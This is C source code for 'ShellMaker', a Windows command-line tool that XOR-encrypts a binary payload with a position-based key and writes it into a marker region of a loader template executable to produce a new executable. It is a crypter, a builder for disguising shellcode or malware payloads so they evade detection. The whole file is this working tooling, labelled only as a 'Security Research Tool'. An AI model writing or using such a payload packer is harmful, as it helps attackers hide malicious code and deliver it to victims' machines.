#include <windows.h>
#include <stdio.h>

// Magic byte marker used in loader template
#define MARKER_BYTE 0x41
#define MIN_MARKER_SEQUENCE 0x42
#define LOADER_TEMPLATE "Loading.exe"

/**
 * @struct FILEINFO
 * @brief Structure to hold file data and size
 */
typedef struct
{
    DWORD size;
    BYTE* buffer;
} FILEINFO;

/**
 * @brief Safe memory copy function with overlap handling
 */
void* MemoryCopy(void* destination, const void* source, size_t length)
{
    if (!destination || !source || length == 0)
    {
        return NULL;
    }

    char* dest = (char*)destination;
    const char* src = (const char*)source;
    void* originalDest = destination;

    if (dest <= src || dest >= src + length)
    {
        // No overlap - copy forward
        for (size_t i = 0; i < length; ++i)
        {
            dest[i] = src[i];
        }
    }
    else
    {
        // Overlap - copy backward
        for (size_t i = length; i > 0; --i)
        {
            dest[i - 1] = src[i - 1];
        }
    }

    return originalDest;
}

/**
 * @brief Open and read a file into memory
 */
FILEINFO OpenFile(const char* filePath)
{
    FILEINFO fileInfo = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;

    if (!filePath)
    {
        return fileInfo;
    }

    // Open file
    hFile = CreateFileA(
        filePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error: Cannot open file: %s (Error: %lu)\n", filePath, GetLastError());
        return fileInfo;
    }

    // Get file size
    fileInfo.size = GetFileSize(hFile, NULL);
    if (fileInfo.size == 0 || fileInfo.size == INVALID_FILE_SIZE)
    {
        printf("[-] Error: Invalid file size: %s\n", filePath);
        CloseHandle(hFile);
        return fileInfo;
    }

    // Allocate buffer
    fileInfo.buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileInfo.size);
    if (!fileInfo.buffer)
    {
        printf("[-] Error: Memory allocation failed\n");
        fileInfo.size = 0;
        CloseHandle(hFile);
        return fileInfo;
    }

    // Read file content
    while (totalBytesRead < fileInfo.size)
    {
        DWORD remainingBytes = fileInfo.size - totalBytesRead;

        if (!ReadFile(hFile, fileInfo.buffer + totalBytesRead, remainingBytes, &bytesRead, NULL))
        {
            printf("[-] Error: Failed to read file (Error: %lu)\n", GetLastError());
            HeapFree(GetProcessHeap(), 0, fileInfo.buffer);
            fileInfo.buffer = NULL;
            fileInfo.size = 0;
            CloseHandle(hFile);
            return fileInfo;
        }

        if (bytesRead == 0)
        {
            break;
        }

        totalBytesRead += bytesRead;
    }

    CloseHandle(hFile);
    return fileInfo;
}

/**
 * @brief Free memory allocated for FILEINFO structure
 */
void FreeFileInfo(FILEINFO* fileInfo)
{
    if (fileInfo && fileInfo->buffer)
    {
        HeapFree(GetProcessHeap(), 0, fileInfo->buffer);
        fileInfo->buffer = NULL;
    }
    if (fileInfo)
    {
        fileInfo->size = 0;
    }
}

/**
 * @brief Write buffer to file
 */
BOOL WriteToFile(BYTE* buffer, DWORD bufferSize, const char* filePath)
{
    if (!buffer || bufferSize == 0 || !filePath)
    {
        return FALSE;
    }

    HANDLE hFile = CreateFileA(
        filePath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error: Cannot create file: %s (Error: %lu)\n", filePath, GetLastError());
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    DWORD totalBytesWritten = 0;
    BYTE* currentPosition = buffer;

    while (totalBytesWritten < bufferSize)
    {
        DWORD bytesToWrite = bufferSize - totalBytesWritten;
        DWORD bytesWritten = 0;

        if (!WriteFile(hFile, currentPosition, bytesToWrite, &bytesWritten, NULL))
        {
            printf("[-] Error: Failed to write file (Error: %lu)\n", GetLastError());
            CloseHandle(hFile);
            HeapFree(GetProcessHeap(), 0, buffer);
            return FALSE;
        }

        totalBytesWritten += bytesWritten;
        currentPosition += bytesWritten;
    }

    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, buffer);

    return TRUE;
}

/**
 * @brief Display application banner
 */
void DisplayBanner(void)
{
    printf("   _____ _          _ _ __  __       _             \n");
    printf("  / ____| |        | | |  \\/  |     | |            \n");
    printf(" | (___ | |__   ___| | | \\  / | __ _| | _____ _ __ \n");
    printf("  \\___ \\| '_ \\ / _ \\ | | |\\/| |/ _` | |/ / _ \\ '__|\n");
    printf("  ____) | | | |  __/ | | |  | | (_| |   <  __/ |   \n");
    printf(" |_____/|_| |_|\\___|_|_|_|  |_|\\__,_|_|\\_\\___|_|   \n");
    printf("                                                    \n");
    printf("\n");
    printf(" ShellMaker v1.0 | Security Research Tool | 2023\n\n");
}

/**
 * @brief Display usage information
 */
void DisplayUsage(void)
{
    printf("[*] USAGE:\n");
    printf("    ShellMaker.exe <input_payload.bin> <output_file.exe>\n\n");
    printf("[*] EXAMPLE:\n");
    printf("    ShellMaker.exe payload.bin encrypted_loader.exe\n\n");
    printf("[*] DESCRIPTION:\n");
    printf("    Encrypts a binary payload and embeds it into a loader executable.\n");
    printf("    The payload is XOR encrypted with a position-based key.\n\n");
}

/**
 * @brief Encrypt payload using XOR with position-based key
 */
void EncryptPayload(BYTE* buffer, DWORD size)
{
    DWORD i;

    if (!buffer || size == 0)
    {
        return;
    }

    for (i = 0; i < size; ++i)
    {
        // XOR with position-based key and add 1
        buffer[i] = (buffer[i] ^ (i + 1)) + 1;
    }
}

/**
 * @brief Find marker sequence in loader template
 */
int FindMarkerOffset(BYTE* loaderData, DWORD loaderSize)
{
    DWORD i;
    int markerCount = 0;
    int markerOffset = -1;

    if (!loaderData || loaderSize == 0)
    {
        return -1;
    }

    for (i = 0; i < loaderSize; ++i)
    {
        if (loaderData[i] == MARKER_BYTE)
        {
            if (markerCount == 0)
            {
                markerOffset = i;
            }
            markerCount++;

            if (markerCount > MIN_MARKER_SEQUENCE)
            {
                return markerOffset;
            }
        }
        else
        {
            markerCount = 0;
            markerOffset = -1;
        }
    }

    return -1;
}

/**
 * @brief Embed encrypted payload into loader template
 */
BOOL EmbedPayload(FILEINFO* loaderInfo, const FILEINFO* payloadInfo)
{
    int markerOffset;
    DWORD requiredSpace;

    if (!loaderInfo->buffer || !payloadInfo->buffer)
    {
        printf("[-] Error: Invalid file buffers\n");
        return FALSE;
    }

    markerOffset = FindMarkerOffset(loaderInfo->buffer, loaderInfo->size);

    if (markerOffset < 0)
    {
        printf("[-] Error: Marker sequence not found in loader template\n");
        return FALSE;
    }

    printf("[+] Marker found at offset: 0x%X\n", markerOffset);

    requiredSpace = sizeof(DWORD) + payloadInfo->size;
    if ((DWORD)markerOffset + requiredSpace > loaderInfo->size)
    {
        printf("[-] Error: Not enough space in loader template\n");
        return FALSE;
    }

    // Write payload size first
    MemoryCopy(&loaderInfo->buffer[markerOffset], &payloadInfo->size, sizeof(DWORD));

    // Write encrypted payload
    MemoryCopy(&loaderInfo->buffer[markerOffset + sizeof(DWORD)],
        payloadInfo->buffer,
        payloadInfo->size);

    printf("[+] Payload embedded successfully\n");
    printf("[+] Payload size: %lu bytes\n", payloadInfo->size);

    return TRUE;
}

/**
 * @brief Process payload and create encrypted loader
 */
BOOL ProcessPayload(const char* inputPath, const char* outputPath)
{
    FILEINFO payloadInfo = { 0 };
    FILEINFO loaderInfo = { 0 };
    BOOL success = FALSE;

    // Load input payload
    printf("[*] Loading payload: %s\n", inputPath);
    payloadInfo = OpenFile(inputPath);

    if (!payloadInfo.buffer || payloadInfo.size == 0)
    {
        printf("[-] Error: Failed to load payload file\n");
        return FALSE;
    }

    printf("[+] Payload loaded: %lu bytes\n", payloadInfo.size);

    // Encrypt payload
    printf("[*] Encrypting payload...\n");
    EncryptPayload(payloadInfo.buffer, payloadInfo.size);
    printf("[+] Payload encrypted\n");

    // Load loader template
    printf("[*] Loading loader template: %s\n", LOADER_TEMPLATE);
    loaderInfo = OpenFile(LOADER_TEMPLATE);

    if (!loaderInfo.buffer || loaderInfo.size == 0)
    {
        printf("[-] Error: Failed to load loader template\n");
        FreeFileInfo(&payloadInfo);
        return FALSE;
    }

    printf("[+] Loader template loaded: %lu bytes\n", loaderInfo.size);

    // Embed encrypted payload into loader
    printf("[*] Embedding payload into loader...\n");
    if (!EmbedPayload(&loaderInfo, &payloadInfo))
    {
        FreeFileInfo(&payloadInfo);
        FreeFileInfo(&loaderInfo);
        return FALSE;
    }

    // Write output file
    printf("[*] Writing output file: %s\n", outputPath);
    if (!WriteToFile(loaderInfo.buffer, loaderInfo.size, outputPath))
    {
        printf("[-] Error: Failed to write output file\n");
        FreeFileInfo(&payloadInfo);
        return FALSE;
    }

    printf("[+] Output file created successfully: %s\n", outputPath);

    // Cleanup
    FreeFileInfo(&payloadInfo);
    // Note: loaderInfo.buffer is freed by WriteToFile

    return TRUE;
}

/**
 * @brief Main entry point
 */
int main(int argc, char* argv[])
{
    const char* inputPath;
    const char* outputPath;

    DisplayBanner();

    // Validate command line arguments
    if (argc != 3)
    {
        DisplayUsage();
        return 1;
    }

    inputPath = argv[1];
    outputPath = argv[2];

    // Process payload
    if (!ProcessPayload(inputPath, outputPath))
    {
        printf("\n[-] Operation failed\n");
        return 1;
    }

    printf("\n[+] Operation completed successfully\n");
    return 0;
}